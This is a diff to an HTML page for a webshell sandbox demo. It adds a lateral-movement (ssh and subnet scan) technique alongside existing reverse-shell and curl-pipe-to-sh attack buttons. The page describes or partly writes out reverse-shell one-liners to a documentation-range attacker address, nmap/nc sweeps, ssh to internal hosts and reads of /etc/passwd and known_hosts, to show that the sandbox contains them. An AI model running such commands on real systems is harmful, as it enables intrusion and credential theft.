@@ -2,7 +2,7 @@
 <!--
   /shell: the webshell sandbox demo, served by the same component as the
   PersonFacts site. The red buttons call /run?mode=…, which fires each
-  remote-shell technique through the webshell's own runCmd and attempts every
+  remote-shell or lateral-movement technique through the webshell's own runCmd and attempts every
   building block from inside the component. The command box calls /exec
   directly, the raw webshell.
 -->
@@ -191,6 +191,7 @@
   .triad{display:flex;gap:10px;flex-wrap:wrap;margin:0 0 16px}
   .triad span{font-family:var(--mono);font-size:12px;color:#f3b79e;background:var(--red-dim);box-shadow:inset 0 0 0 1px var(--red-line);border-radius:8px;padding:5px 10px}
   .tech{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .tech.pivot{grid-template-columns:1fr;margin-top:14px}
   @media(max-width:860px){.tech{grid-template-columns:1fr}}
   .tc{border:1px solid var(--line);border-radius:14px;background:linear-gradient(180deg,var(--card),var(--card2));padding:15px 16px;display:flex;flex-direction:column;gap:8px}
   .tc h3{margin:0;font-size:16px}
@@ -272,7 +273,7 @@
   </a>
 
   <p class="eyebrow">Sandboxing: <span class="ws">Webshell</span> · MITRE ATT&amp;CK T1505.003 · CWE-78 OS command injection · live demo</p>
-  <p class="eyebrow blocking">Blocking: <span class="ws">T1059.004</span> Unix shell · <span class="ws">T1059.006</span> Python · <span class="ws">T1105</span> ingress tool transfer</p>
+  <p class="eyebrow blocking">Blocking: <span class="ws">T1059.004</span> Unix shell · <span class="ws">T1059.006</span> Python · <span class="ws">T1105</span> ingress tool transfer · <span class="ws">T1021</span> remote services (lateral movement)</p>
   <h1>You can't execute<br>what you <span class="u">don't have</span>.</h1>
   <p class="lede">A <b class="ws" style="color:var(--red)">web shell</b> is a small malicious script planted on a web server. It lets an attacker control that server from a browser: they type a command into a hidden page, the server runs it and sends back the result. It's a remote control panel hiding inside your own website, and it <b>keeps working after the original hole is patched</b>.</p>
   <p class="lede" style="margin-top:10px"><a href="/">PersonFacts</a> is a web app with a web shell built in. Its normal pages work as expected, but one URL, <code>/exec?cmd=…&amp;arg=…</code>, takes whatever command and argument you send and runs them on the host. Inside a container, that is <b>the whole server handed over</b>. An attacker can dump credentials and secrets, open a connection back to their own machine, and download the next piece of their toolkit.</p>
@@ -308,28 +309,38 @@
         <div class="here"><b>In this sandbox:</b> <code>allowedHosts: []</code>, so the host denies the fetch; there's no disk to stage on and nothing to exec it with.</div>
       </div>
     </div>
+    <div class="tech pivot">
+      <div class="tc">
+        <h3>lateral movement (ssh + subnet scan)</h3>
+        <p>What comes after the shell (MITRE ATT&amp;CK <b>T1021</b>, remote services): find the neighbours, then log in to them. Read <code>~/.ssh/known_hosts</code> and <code>/etc/hosts</code> for targets, sweep the subnet with <code>nmap</code> or <code>nc -zv</code>, then <code>ssh</code>, SMB, RDP or WinRM to whatever answers. It needs the same things a remote shell does, pointed inward: a tool to run and a connection to open.</p>
+        <div class="sig"><b>Detection signal:</b> a web server process opening connections to internal hosts on 22, 445, 3389 or 5985, or one source touching many addresses and ports in seconds.</div>
+        <div class="here"><b>In this sandbox:</b> no ssh, nc or nmap to start, no files to read targets from, and the component's world imports no <code>wasi:sockets</code>, so there is nothing to open a connection with. The one network path it has, outbound HTTP, is <code>allowedHosts: []</code>.</div>
+      </div>
+    </div>
   </div>
 
   <!-- try it -->
   <div class="try">
     <h2>Try it — fire a real attack at the sandbox</h2>
-    <p class="sub">Each red button sends a real reverse-shell one-liner through the webshell, then attempts every building block from inside the component, the way an attacker who owns this process would. Nothing is simulated or patched. The attacker address is <code>203.0.113.66</code>, a documentation-only range that is never routed.</p>
+    <p class="sub">Each red button sends a real attack command line through the webshell, then attempts every building block from inside the component, the way an attacker who owns this process would. Nothing is simulated or patched. The attacker address is <code>203.0.113.66</code>, a documentation-only range that is never routed; the lateral-movement targets are in <code>10.0.0.0/29</code>, a private range.</p>
     <table class="bugtable">
       <thead><tr><th>Button</th><th>Technique</th><th>What it attempts</th></tr></thead>
       <tbody>
         <tr><td><span class="bugtag">Bash</span></td><td>/dev/tcp · mkfifo + nc</td><td>Starts bash with <code>bash -i &gt;&amp; /dev/tcp/…/4444 0&gt;&amp;1</code> and sh with a FIFO-fed netcat, then dials out and opens <code>/dev/tcp</code> directly.</td></tr>
         <tr><td><span class="bugtag">Python</span></td><td>socket → dup2 → pty.spawn</td><td>Starts python3 with the canonical one-liner, then dials out, opens <code>/dev/ptmx</code> and spawns <code>/bin/sh</code> from inside the component.</td></tr>
         <tr><td><span class="bugtag">Curl</span></td><td>stage-and-run</td><td>Runs <code>curl … | sh</code> and <code>wget</code>, then fetches the stage through the host, writes it to <code>/tmp</code> and tries to execute it.</td></tr>
-        <tr><td><span class="bugtag">Run all</span></td><td>all three at once</td><td>Every technique above in one request, to show the sandbox contains them together.</td></tr>
+        <tr><td><span class="bugtag">Pivot</span></td><td>lateral movement · T1021</td><td>Runs <code>ssh deploy@10.0.0.5</code>, <code>nc -zv</code> and <code>nmap</code>, then reads <code>known_hosts</code> and <code>/etc/hosts</code>, resolves an internal name, dials five host and port pairs in <code>10.0.0.0/29</code>, sends a UDP and an ICMP probe, and requests WinRM through the host.</td></tr>
+        <tr><td><span class="bugtag">Run all</span></td><td>all four at once</td><td>Every technique above in one request, to show the sandbox contains them together.</td></tr>
       </tbody>
     </table>
     <div class="btns">
       <button class="btn attack" id="runBash">☣ Bash — /dev/tcp</button>
       <button class="btn attack" id="runPython">☣ Python — dup2 + pty</button>
       <button class="btn attack" id="runCurl">☣ Curl — stage-and-run</button>
+      <button class="btn attack" id="runPivot">☣ Pivot — ssh + subnet scan</button>
       <button class="btn attack all" id="runAll">☣ Run all attacks</button>
     </div>
-    <div class="dllinks">raw JSON: <a href="/run?mode=bash">bash</a> · <a href="/run?mode=python">python</a> · <a href="/run?mode=curl">curl</a> · <a href="/run?mode=all">all</a></div>
+    <div class="dllinks">raw JSON: <a href="/run?mode=bash">bash</a> · <a href="/run?mode=python">python</a> · <a href="/run?mode=curl">curl</a> · <a href="/run?mode=pivot">pivot</a> · <a href="/run?mode=all">all</a></div>
 
     <form class="cmdbox" id="cmdform" autocomplete="off">
       <input id="cmd" type="text" spellcheck="false" value="cat /etc/passwd" aria-label="command to send to the webshell">
@@ -394,12 +405,13 @@
   const $ = (id)=>document.getElementById(id);
   const out=$('out');
 
-  // The four attack buttons. Clicking one GETs /run with its mode; the
+  // The five attack buttons. Clicking one GETs /run with its mode; the
   // component fires that technique through its own webshell.
   const ATTACKS = {
     runBash:   {mode:'bash',   label:'☣ Bash — /dev/tcp'},
     runPython: {mode:'python', label:'☣ Python — dup2 + pty'},
     runCurl:   {mode:'curl',   label:'☣ Curl — stage-and-run'},
+    runPivot:  {mode:'pivot',  label:'☣ Pivot — ssh + subnet scan'},
     runAll:    {mode:'all',    label:'☣ Run all attacks'},
   };
   const attackBtns = Object.keys(ATTACKS).map($);
@@ -419,7 +431,7 @@
     }
   }
   Object.keys(ATTACKS).forEach(id=>$(id).addEventListener('click', ()=>fire(id)));
-  // /shell#all (or #bash, #python, #curl) fires that attack on load: a link
+  // /shell#all (or #bash, #python, #curl, #pivot) fires that attack on load: a link
   // you can share that opens with the results showing.
   const auto=Object.keys(ATTACKS).find(id=>'#'+ATTACKS[id].mode===location.hash);
   if(auto){ fire(auto).then(()=>$('out').scrollIntoView({block:'start'})); }
@@ -442,7 +454,7 @@
 
   function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]))}
 
-  const BLOCK = {network:'1 · network', bind:'2 · bind / stage', spawn:'3 · spawn'};
+  const BLOCK = {network:'1 · network', bind:'2 · bind / stage', spawn:'3 · spawn', discover:'find targets'};
 
   function render(r){
     out.style.display='block';
@@ -458,7 +470,7 @@
       stat('good', blockedOf('network'), 'network connections refused'),
       stat('good', blockedOf('bind'),    'binds and stages refused'),
       stat('good', blockedOf('spawn'),   'shells and processes refused'),
-    ].join('');
+    ].concat(count('discover').length ? [stat('good', blockedOf('discover'), 'target lookups refused')] : []).join('');
 
     $('table').innerHTML=(r.techniques||[]).map(t=>{
       const rows=t.steps.map(s=>{
